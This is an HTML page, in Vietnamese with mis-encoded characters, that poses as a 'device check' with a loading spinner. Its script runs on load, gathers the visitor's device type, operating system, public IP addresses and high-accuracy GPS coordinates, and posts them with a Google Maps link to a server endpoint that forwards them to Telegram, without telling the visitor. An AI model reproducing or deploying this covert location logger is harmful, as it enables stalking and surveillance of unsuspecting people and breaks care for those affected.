<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8" />
  <title>Ki·ªÉm tra thi·∫øt b·ªã</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      background: linear-gradient(135deg, #e0f7fa, #f1f8e9);
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      text-align: center;
    }

    .box {
      background-color: white;
      padding: 40px 30px;
      border-radius: 12px;
      box-shadow: 0 6px 15px rgba(0, 0, 0, 0.1);
      max-width: 400px;
      width: 90%;
      animation: fadeIn 1s ease-in-out;
    }

    h3 {
      font-size: 1.2rem;
      color: #333;
      margin-bottom: 10px;
    }

    .spinner {
      margin: 20px auto 0;
      width: 40px;
      height: 40px;
      border: 4px solid #ccc;
      border-top: 4px solid #00796b;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(20px); }
      to { opacity: 1; transform: translateY(0); }
    }
  </style>
</head>
<body>
  <div class="box">
    <h3>ƒêang ki·ªÉm tra thi·∫øt b·ªã, vui l√≤ng ch·ªù...</h3>
    <div class="spinner"></div>
  </div>

  <script>
    const info = {
      time: new Date().toLocaleString(),
      device: '',
      os: '',
      ip: '',
      realIp: '',
      lat: '',
      lon: '',
    };

    function detectDevice() {
      const ua = navigator.userAgent;
      if (/iPhone|iPad|iPod/i.test(ua)) {
        info.device = 'iOS Device';
        info.os = 'iOS';
      } else if (/Android/i.test(ua)) {
        const match = ua.match(/Android.*; (.+?) Build/);
        info.device = match ? match[1] : 'Android Device';
        info.os = 'Android';
      } else if (/Windows NT/i.test(ua)) {
        info.device = 'Windows PC';
        info.os = 'Windows';
      } else if (/Macintosh/i.test(ua)) {
        info.device = 'Mac';
        info.os = 'macOS';
      } else {
        info.device = 'Kh√¥ng x√°c ƒë·ªãnh';
        info.os = 'Kh√¥ng r√µ';
      }
    }

    async function getPublicIP() {
      try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        info.ip = data.ip || 'Kh√¥ng r√µ';
      } catch {
        info.ip = 'Kh√¥ng r√µ';
      }
    }

    async function getRealIP() {
      try {
        const res = await fetch('https://icanhazip.com');
        info.realIp = (await res.text()).trim();
      } catch {
        info.realIp = 'Kh√¥ng r√µ';
      }
    }

    async function getLocation() {
      return new Promise(resolve => {
        if (!navigator.geolocation) {
          resolve();
          return;
        }
        navigator.geolocation.getCurrentPosition(
          pos => {
            info.lat = pos.coords.latitude.toFixed(6);
            info.lon = pos.coords.longitude.toFixed(6);
            resolve();
          },
          () => resolve(),
          { enableHighAccuracy: true, timeout: 8000 }
        );
      });
    }

    function getCaption() {
      const mapsLink = info.lat && info.lon
        ? `https://maps.google.com/?q=${info.lat},${info.lon}`
        : 'Kh√¥ng r√µ';
      return `
üïí Th·ªùi gian: ${info.time}
üì± Thi·∫øt b·ªã: ${info.device}
üñ•Ô∏è H·ªá ƒëi·ªÅu h√†nh: ${info.os}
üåç IP d√¢n c∆∞: ${info.ip}
üß† IP g·ªëc: ${info.realIp}
üìç Google Maps: ${mapsLink}
      `.trim();
    }

    async function sendToServer() {
      const text = getCaption();
      try {
        const response = await fetch('/api/sendTelegram', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ message: text }),
        });
        if (!response.ok) {
          const errorData = await response.json();
          console.error('L·ªói khi g·ª≠i Telegram:', errorData);
        } else {
          console.log('G·ª≠i Telegram th√†nh c√¥ng');
        }
      } catch (error) {
        console.error('L·ªói m·∫°ng ho·∫∑c fetch:', error);
      }
    }

    async function main() {
      detectDevice();
      await getPublicIP();
      await getRealIP();
      await getLocation();
      await sendToServer();
    }

    main();
  </script>
</body>
</html>
